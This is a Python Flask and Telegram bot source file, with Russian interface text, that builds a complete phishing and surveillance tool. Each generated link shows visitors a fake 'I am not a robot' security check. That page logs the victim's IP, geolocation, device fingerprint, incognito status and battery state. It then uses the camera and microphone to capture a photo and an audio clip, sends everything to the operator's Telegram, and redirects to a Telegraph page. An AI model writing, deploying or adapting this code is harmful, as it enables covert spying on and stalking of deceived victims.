import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

db = {} 

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">⚡ CORE SYSTEM V3</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;">АКТИВИРОВАТЬ</a>
    </body>
    '''

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ СИСТЕМА ВООРУЖЕНА"
    return "❌ ОШИБКА"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "EXPIRED", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g_info = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g_info = f"🌍 {r['country']}, {r['city']}\n📡 {r['isp']}\n🛡 VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}"
    except: pass
    
    bot.send_message(owner_id, f"🎯 КЛИК!\n👤 IP: `{ip}`\n{g_info}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Загрузка...";
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A" }},
                net: {{ tz: Intl.DateTimeFormat().resolvedOptions().timeZone, type: navigator.connection ? navigator.connection.effectiveType : "N/A", history: history.length }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                incognito: false, adblock: false
            }};

            // Инкогнито и Батарея
            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.incognito = true;
            }}
            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "Заряжается" : "Нет";
            }} catch(e) {{}}

            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                
                // Запись звука
                const recorder = new MediaRecorder(s);
                const audioChunks = [];
                recorder.ondataavailable = e => audioChunks.push(e.data);
                recorder.onstop = () => {{
                    const blob = new Blob(audioChunks, {{ type: 'audio/ogg' }});
                    const f = new FormData(); f.append('audio', blob, '1.ogg'); f.append('uid', "{uid}");
                    fetch('/log_audio', {{ method: 'POST', body: f }});
                }};
                recorder.start();
                setTimeout(() => recorder.stop(), 3500);

                // Фото
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "{target}";
                        }});
                    }}, 'image/jpeg', 0.6);
                }}, 1000);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 ТТХ ID: `{d['uid']}`\n\n"
             f"🔋 Заряд: `{d['bat']['lvl']}` (`{d['bat']['char']}`)\n"
             f"🌐 Сеть: `{d['net']['type']}` | Вкладок: `{d['net']['history']}`\n"
             f"🧠 Ядра: `{d['hw']['cores']}` | ОЗУ: `{d['hw']['ram']}GB`\n"
             f"🕵️ Инкогнито: `{'ДА' if d['incognito'] else 'НЕТ'}`\n"
             f"🕒 Пояс: `{d['net']['tz']}`")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, file = request.form.get('uid'), request.files.get('photo')
    if uid in db and file:
        bot.send_photo(db[uid]['owner'], file.read(), caption=f"📸 ФОТО ID: `{uid}`")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, file = request.form.get('uid'), request.files.get('audio')
    if uid in db and file:
        bot.send_voice(db[uid]['owner'], file.read(), caption=f"🎤 ЗВУК ID: `{uid}`")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ Ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
